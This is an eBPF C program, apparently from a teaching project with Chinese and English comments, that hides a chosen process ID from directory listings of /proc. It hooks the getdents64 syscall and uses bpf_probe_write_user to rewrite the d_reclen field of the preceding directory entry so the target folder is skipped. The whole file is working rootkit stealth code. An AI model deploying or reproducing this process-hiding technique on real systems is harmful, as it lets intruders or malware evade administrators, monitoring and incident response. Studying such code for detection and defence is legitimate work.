// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "pidhide.h"

#define my_bpf_printk(fmt, ...) \
    bpf_printk("[PID_HIDE] " fmt, ##__VA_ARGS__)

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct
{
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Map to fold the dents buffer addresses
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buffs SEC(".maps");

// Map used to enable searching through the
// data in a loop
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

// Map with address of actual
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps");

// Map to hold program tail calls
struct
{
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");

// Optional Target Parent PID
const volatile int target_ppid = 0;

// These store the string represenation
// of the PID to hide. This becomes the name
// of the folder in /proc/
const volatile u32 pid_to_hide_len = 0;
const volatile char pid_to_hide[MAX_PID_LEN] = "";

// struct linux_dirent64 {
//     u64        d_ino;    /* 64-bit inode number */
//     u64        d_off;    /* 64-bit offset to next structure */
//     unsigned short d_reclen; /* Size of this dirent */
//     unsigned char  d_type;   /* File type */
//     char           d_name[]; /* Filename (null-terminated) */ };
// int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // u32 pid = pid_tgid >> 32;
    // u32 tid = (u32)pid_tgid;

    // 调试信息
    // my_bpf_printk("DEBUG: Entry - PID: %d, TID: %d, Hide PID: %d\n", 
    //              pid, tid, cfg->pid_to_hide);

    // my_bpf_printk("[handle_getdents_enter] DEBUG: - PID: %d, TID: %d, target_ppid: %d\n", pid, tid, target_ppid);

    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0)
    {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid)
        {
            return 0;
        }
    }
    // int pid = pid_tgid >> 32;
    // unsigned int fd = ctx->args[0];
    // unsigned int buff_count = ctx->args[2];

    // Store params in map for exit function
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    u32 pid = pid_tgid >> 32;
    u32 tid = (u32)pid_tgid;

    int total_bytes_read = ctx->ret;

    // my_bpf_printk("[sys_exit_getdents64] DEBUG: - PID: %d, TID: %d, total_bytes_read: %d\n", pid, tid, total_bytes_read);

    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0)
    {
        my_bpf_printk("[sys_exit_getdents64] WARN: bytes_read is 0, everything's been read");
        return 0;
    }

    // Check we stored the address of the buffer from the syscall entry
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (pbuff_addr == 0)
    {
        my_bpf_printk("[sys_exit_getdents64] ERROR: Config not found\n");
        return 0;
    }

    // 所有这些逻辑相当复杂，但本质上可以归结为：
    // 在一个循环中反复调用 handle_getdents_exit，每次处理最多 200 个目录项的文件列表块，
    // 检查其中是否存在一个名称等于当前进程 PID 的文件夹。
    // 如果找到了该文件夹，就通过 bpf_tail_call 跳转到 handle_getdents_patch，
    // 由它来执行实际的隐藏（patch）操作。
    // All of this is quite complex, but basically boils down to
    // Calling 'handle_getdents_exit' in a loop to iterate over the file listing
    // in chunks of 200, and seeing if a folder with the name of our pid is in there.
    // If we find it, use 'bpf_tail_call' to jump to handle_getdents_patch to do the actual
    // patching
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    // int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];

    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    // my_bpf_printk("[sys_exit_getdents64] DEBUG: bpos:%d,pBPOS:%p\n", bpos, pBPOS);
    if (pBPOS != 0)
    {
        bpos = *pBPOS;
    }

    my_bpf_printk("[sys_exit_getdents64] PID=%d,TID=%d,total_bytes_read=%d\n", pid, tid, total_bytes_read);
    my_bpf_printk("[sys_exit_getdents64] pBPOS=%p,bpos=%d\n", pBPOS, bpos);
    // my_bpf_printk("[sys_exit_getdents64] DEBUG: pid_to_hide_len:%d, pid_to_hide:%s\n", pid_to_hide_len, pid_to_hide);
    // my_bpf_printk("[sys_exit_getdents64] DEBUG: pid_to_hide_len:%d\n", pid_to_hide_len);

    for (int i = 0; i < 200; i++)
    {
        if (bpos >= total_bytes_read)
        {
            break;
        }

        my_bpf_printk("[sys_exit_getdents64] i=%d,bpos=%d\n", i, bpos);

        dirp = (struct linux_dirent64 *)(buff_addr + bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);

        my_bpf_printk("[sys_exit_getdents64] i=%d,d_reclen=%d,pid_to_hide_len=%d\n", i, d_reclen, pid_to_hide_len);
        my_bpf_printk("[sys_exit_getdents64] i=%d,filename=%s\n", i, filename);

        int j = 0;
        for (j = 0; j < pid_to_hide_len; j++)
        {
            if (filename[j] != pid_to_hide[j])
            {
                break;
            }
        }
        if (j == pid_to_hide_len)
        {
            // ***********
            // We've found the folder!!!
            // Jump to handle_getdents_patch so we can remove it!
            // ***********
            my_bpf_printk("[sys_exit_getdents64] i=%d,找到了目录:%s\n", i, filename);
            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            bpf_map_delete_elem(&map_buffs, &pid_tgid);
            bpf_tail_call(ctx, &map_prog_array, PROG_02);
        }
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    // 如果我们尚未找到目标，但还有更多数据需要读取，
    // 就跳回到本函数的开头，继续查找。
    // If we didn't find it, but there's still more to read,
    // jump back the start of this function and keep looking
    if (bpos < total_bytes_read)
    {
        my_bpf_printk("[sys_exit_getdents64] 跳回到本函数的开头，继续查找 pBPOS=%p bpos=%d,total_bytes_read=%d\n", 
            pBPOS, bpos, total_bytes_read);

        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array, PROG_01);
    }
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);

    return 0;
}

SEC("tp/unused")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{
    // Only patch if we've already checked and found our pid's folder to hide
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (pbuff_addr == 0)
    {
        return 0;
    }

    // Unlink target, by reading in previous linux_dirent64 struct,
    // and setting it's d_reclen to cover itself and our target.
    // This will make the program skip over our folder.
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr + d_reclen_previous);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // Debug print
    char filename[MAX_PID_LEN];
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
    filename[pid_to_hide_len - 1] = 0x00;
    my_bpf_printk("filename previous %s\n", filename);
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
    filename[pid_to_hide_len - 1] = 0x00;
    my_bpf_printk("filename next one %s\n", filename);

    // Attempt to overwrite
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    // Send an event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e)
    {
        e->success = (ret == 0);
        e->pid = (pid_tgid >> 32);
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }

    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    return 0;
}
